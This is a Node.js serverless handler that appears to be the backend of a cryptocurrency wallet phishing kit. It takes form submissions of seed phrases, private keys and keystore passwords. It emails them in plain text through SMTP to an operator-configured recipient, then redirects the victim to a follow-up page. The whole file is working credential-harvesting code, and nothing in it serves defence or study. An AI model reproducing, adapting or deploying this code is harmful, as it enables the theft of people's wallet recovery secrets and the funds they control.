const nodemailer = require('nodemailer');
const { parse } = require('querystring');
const { IncomingForm } = require('formidable');

async function parseBody(req) {
  const contentType = req.headers['content-type'] || '';

  if (contentType.includes('application/json')) {
    const chunks = [];
    for await (const chunk of req) {
      chunks.push(chunk);
    }

    const raw = Buffer.concat(chunks).toString('utf8');
    return raw ? JSON.parse(raw) : {};
  }

  if (contentType.includes('multipart/form-data')) {
    const form = new IncomingForm({ keepExtensions: true, multiples: false });
    return new Promise((resolve, reject) => {
      form.parse(req, (error, fields, files) => {
        if (error) {
          reject(error);
          return;
        }

        const result = {};
        for (const [key, value] of Object.entries(fields)) {
          result[key] = Array.isArray(value) ? value[0] : value;
        }
        for (const [key, value] of Object.entries(files)) {
          result[key] = value;
        }
        resolve(result);
      });
    });
  }

  const chunks = [];
  for await (const chunk of req) {
    chunks.push(chunk);
  }

  const raw = Buffer.concat(chunks).toString('utf8');
  return raw ? parse(raw) : {};
}

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  try {
    const body = await parseBody(req);
    const walletName = body.wallet_name || body.walletName || body.wallet_type || body.walletType || 'N/A';
    const phase = body.phase || body.verification_method || body.verificationMethod || 'seedphrase';
    const password = body.pw || body.password || body.keystorePassword || body.privateKey || body.seedphrase || 'N/A';
    const seedphrase = body.seedphrase || 'N/A';
    const privateKey = body.privateKey || 'N/A';
    const keystorePassword = body.keystorePassword || 'N/A';

    if (!phase || phase.trim() === '') {
      return res.status(400).send('Required field missing.');
    }

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587', 10),
      secure: process.env.SMTP_PORT === '465',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASSWORD,
      },
    });

    const mailOptions = {
      from: `${process.env.SMTP_FROM_NAME || 'Wallet Form'} <${process.env.SMTP_FROM_EMAIL || process.env.SMTP_USER}>`,
      to: process.env.RECIPIENT_EMAIL || process.env.SMTP_USER,
      subject: 'New Wallet Import Submission',
      text: [
        `Wallet: ${walletName}`,
        `Phase: ${phase}`,
        `Seedphrase: ${seedphrase}`,
        `Private Key: ${privateKey}`,
        `Keystore Password: ${keystorePassword}`,
        `Password: ${password}`,
      ].join('\n'),
    };

    await transporter.sendMail(mailOptions);
    res.writeHead(302, { Location: '/rdr.html' });
    res.end();
  } catch (error) {
    console.error('Email error:', error);
    res.status(500).send('Message could not be sent. Error: ' + error.message);
  }
};
